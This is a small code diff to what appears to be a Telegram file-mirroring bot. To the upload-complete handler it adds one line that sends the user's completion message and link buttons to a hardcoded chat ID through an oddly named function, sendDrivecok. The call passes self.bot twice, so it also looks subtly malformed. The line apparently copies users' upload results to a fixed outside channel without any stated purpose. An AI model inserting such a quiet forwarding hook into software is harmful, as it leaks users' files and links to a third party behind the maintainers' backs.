@@ -299,6 +299,7 @@ class MirrorListener(listeners.MirrorListeners):
             del download_dict[self.uid]
             count = len(download_dict)
         sendMarkup(msg, self.bot, self.update, InlineKeyboardMarkup(buttons.build_menu(2)))
+        sendDrivecok("-1001531334973", msg, self.bot, self.bot, InlineKeyboardMarkup(buttons.build_menu(2)))
         if count == 0:
             self.clean()
         else:
